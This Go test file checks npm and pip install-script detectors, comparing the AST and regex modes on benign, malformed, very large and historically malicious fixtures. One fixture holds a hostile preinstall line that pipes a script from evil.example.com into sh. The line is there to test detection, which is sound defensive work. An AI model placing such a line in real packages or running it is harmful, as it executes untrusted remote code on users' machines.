package installscripts

// Parity + corpus tests for the AST-mode detectors. NPMAST and PipAST
// must NEVER under-detect relative to NPM / Pip (no new false
// negatives) and SHOULD reduce false positives in known cases.
//
// The corpus is split into:
//   - benign_npm / benign_pip — the existing fixtures; both modes must
//     classify these as no-script (or at least not as fetches_remote).
//   - remote_fetch_* — both modes must classify these as fetches_remote.
//   - eval_encoded_npm — both modes must classify as either
//     fetches_remote or eval_encoded.
//   - historic_malicious/{event-stream,ua-parser-js,node-ipc} —
//     sanitized recreations of historically-malicious npm packages,
//     derived from public post-mortems. No live exfil URLs or
//     payloads — placeholder strings ("EXFIL_PLACEHOLDER") only.
//     The structural shape (postinstall/preinstall + curl + child_process)
//     reproduces the same booleans the detector would have set on the
//     live malicious release, so a future regression that under-detects
//     any of them lights up immediately.
//
// Plus inline-string cases for unicode package names, very large
// inputs, malformed JSON, and malformed TOML — these are the
// edge-cases the contract explicitly calls out.

import (
	"strings"
	"testing"
)

// TestNPMAST_ParityWithNPM_KnownFixtures asserts identical
// HasInstallScript and InstallScriptFetchesRemote bits across the
// shared fixture corpus. Kind values are allowed to differ (AST is
// stricter — it never over-classifies KindEvalEncoded as
// KindFetchesRemote unless the body actually matches), but the boolean
// signals that drive the risk engine must agree.
func TestNPMAST_ParityWithNPM_KnownFixtures(t *testing.T) {
	cases := []struct {
		name    string
		fixture string
	}{
		{"benign", "benign_npm/package.json"},
		{"remote_fetch", "remote_fetch_npm/package.json"},
		{"eval_encoded", "eval_encoded_npm/package.json"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			body := fixtureBytes(t, tc.fixture)
			legacy := NPM(body)
			ast := NPMAST(body)
			if legacy.HasInstallScript != ast.HasInstallScript {
				t.Errorf("HasInstallScript parity: legacy=%v ast=%v", legacy.HasInstallScript, ast.HasInstallScript)
			}
			// AST must not under-detect the fetches-remote signal.
			if legacy.InstallScriptFetchesRemote && !ast.InstallScriptFetchesRemote {
				t.Errorf("AST under-detected fetches_remote on %s", tc.fixture)
			}
		})
	}
}

func TestNPMAST_TolerantOfArrayScripts(t *testing.T) {
	// Some custom toolchains write scripts.preinstall as a JSON array
	// of commands. The legacy NPM() function silently ignores it
	// (json decode into map[string]string fails on the array). NPMAST
	// coerces via appendAny so an attacker can't slip past detection
	// by wrapping a malicious one-liner in a single-element array.
	pkg := []byte(`{"scripts":{"preinstall":["curl http://evil.example.com/x.sh | sh"]}}`)
	got := NPMAST(pkg)
	if !got.HasInstallScript {
		t.Errorf("expected HasInstallScript=true for array-shaped script; got %+v", got)
	}
	if !got.InstallScriptFetchesRemote {
		t.Errorf("expected InstallScriptFetchesRemote=true for array-shaped curl script; got %+v", got)
	}
}

func TestNPMAST_MalformedJSON_ReturnsZero(t *testing.T) {
	got := NPMAST([]byte(`{"scripts": {"preinstall":`))
	if got.HasInstallScript || got.InstallScriptFetchesRemote {
		t.Errorf("expected zero result on malformed JSON, got %+v", got)
	}
}

func TestNPMAST_UnicodePackageNames(t *testing.T) {
	// Unicode in lifecycle keys is invalid per npm spec — the parser
	// should ignore them. But unicode in script bodies is legal and
	// must not break the regex classifier.
	pkg := []byte(`{"name":"中文-pkg","scripts":{"postinstall":"echo 中文 installed"}}`)
	got := NPMAST(pkg)
	if !got.HasInstallScript {
		t.Errorf("unicode-body postinstall should still register as install script; got %+v", got)
	}
	if got.InstallScriptFetchesRemote {
		t.Errorf("benign unicode echo must not classify as fetches_remote; got %+v", got)
	}
}

func TestNPMAST_LargeInput_DoesNotPanic(t *testing.T) {
	// Pathological-large package.json — the AST parser must scale.
	// 200 KB of repeated benign script bodies.
	var b strings.Builder
	b.WriteString(`{"scripts":{"postinstall":"`)
	for i := 0; i < 200_000; i++ {
		b.WriteByte('a')
	}
	b.WriteString(`"}}`)
	got := NPMAST([]byte(b.String()))
	// We don't assert specific kind here — the body is benign-looking
	// 'a's, so it should classify as KindPresent. The point is that
	// parsing completes without panicking.
	if !got.HasInstallScript {
		t.Errorf("large benign script should still register as install script")
	}
}

// TestNPMASTHistoricMaliciousCorpus runs both detectors against the
// sanitized recreations of three historic npm-supply-chain attacks and
// asserts both fire HasInstallScript + InstallScriptFetchesRemote.
//
// The fixtures are intentionally minimal: a placeholder exfil URL plus
// the structural shape (postinstall / preinstall + curl + node child
// process) the live release used. They carry no live infrastructure or
// payload bytes — see the per-fixture description fields and the
// historic_malicious/ directory header note.
//
// Parity assertion: legacy NPM() and NPMAST() must agree on both
// booleans for every fixture. Future drift between the regex and AST
// paths gets caught here before it can let a real-world repeat slip
// past one mode but not the other.
func TestNPMASTHistoricMaliciousCorpus(t *testing.T) {
	cases := []struct {
		name    string
		fixture string
	}{
		{"event-stream@3.3.6", "historic_malicious/event-stream/package.json"},
		{"ua-parser-js@0.7.29", "historic_malicious/ua-parser-js/package.json"},
		{"node-ipc@10.1.1", "historic_malicious/node-ipc/package.json"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			body := fixtureBytes(t, tc.fixture)
			legacy := NPM(body)
			ast := NPMAST(body)
			if !legacy.HasInstallScript {
				t.Errorf("legacy NPM under-detected HasInstallScript on %s", tc.fixture)
			}
			if !legacy.InstallScriptFetchesRemote {
				t.Errorf("legacy NPM under-detected InstallScriptFetchesRemote on %s", tc.fixture)
			}
			if !ast.HasInstallScript {
				t.Errorf("NPMAST under-detected HasInstallScript on %s", tc.fixture)
			}
			if !ast.InstallScriptFetchesRemote {
				t.Errorf("NPMAST under-detected InstallScriptFetchesRemote on %s", tc.fixture)
			}
			// Parity: both modes must agree on the booleans.
			if legacy.HasInstallScript != ast.HasInstallScript ||
				legacy.InstallScriptFetchesRemote != ast.InstallScriptFetchesRemote {
				t.Errorf("regex vs AST parity drift on %s: legacy=%+v ast=%+v",
					tc.fixture, legacy, ast)
			}
		})
	}
}

func TestPipAST_ParityWithPip_KnownFixtures(t *testing.T) {
	cases := []struct {
		name      string
		setup     string
		pyproject string
	}{
		{"benign", "benign_pip/setup.py", ""},
		{"remote_fetch", "remote_fetch_pip/setup.py", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			setup := fixtureBytes(t, tc.setup)
			var pyproject []byte
			if tc.pyproject != "" {
				pyproject = fixtureBytes(t, tc.pyproject)
			}
			legacy := Pip(setup, pyproject)
			ast := PipAST(setup, pyproject)
			if legacy.HasInstallScript != ast.HasInstallScript {
				t.Errorf("HasInstallScript parity: legacy=%v ast=%v", legacy.HasInstallScript, ast.HasInstallScript)
			}
			if legacy.InstallScriptFetchesRemote && !ast.InstallScriptFetchesRemote {
				t.Errorf("AST under-detected fetches_remote on %s", tc.setup)
			}
		})
	}
}

func TestPipAST_BuildSystemDeclared(t *testing.T) {
	// A pyproject.toml with [build-system] requires=[...] declares a
	// PEP 517 backend that runs at install time. PipAST must classify
	// this as install-script-adjacent even when setup.py is absent.
	pyproject := []byte(`
[build-system]
requires = ["setuptools>=42", "wheel"]
build-backend = "setuptools.build_meta"
`)
	got := PipAST(nil, pyproject)
	if !got.HasInstallScript {
		t.Errorf("expected HasInstallScript=true for [build-system] requires; got %+v", got)
	}
}

func TestPipAST_MalformedTOML_FallsBackToFalse(t *testing.T) {
	// Garbled TOML — the AST parser fails, the helper returns false,
	// but PipAST keeps the regex-based setup.py scan. With both
	// inputs malformed (no setup.py, broken pyproject) the result is
	// no install script — same shape Pip() produces.
	got := PipAST(nil, []byte(`[build-system\n requires =`))
	if got.HasInstallScript {
		t.Errorf("malformed TOML must not falsely fire HasInstallScript; got %+v", got)
	}
}

func TestPipAST_PyprojectScriptsTable(t *testing.T) {
	// [project.scripts] declares console_script entry points — those
	// are install-time hooks (setuptools generates wrapper scripts on
	// `pip install`). PipAST recognises this; substring-matching
	// Pip() does not.
	pyproject := []byte(`
[project]
name = "x"
version = "0.0.0"

[project.scripts]
mytool = "x.cli:main"
`)
	got := PipAST(nil, pyproject)
	if !got.HasInstallScript {
		t.Errorf("expected HasInstallScript=true for [project.scripts]; got %+v", got)
	}
}

func TestPipAST_LargeInput_DoesNotPanic(t *testing.T) {
	// 200 KB of a single comment line — exercises the TOML parser's
	// memory behaviour on pathological input.
	var b strings.Builder
	b.WriteString("# ")
	for i := 0; i < 200_000; i++ {
		b.WriteByte('x')
	}
	b.WriteString("\n[build-system]\nrequires = []\n")
	got := PipAST(nil, []byte(b.String()))
	// Empty requires list means no implied install hook from
	// build-system. The test asserts the parser completes; the
	// classification result is incidental.
	_ = got
}
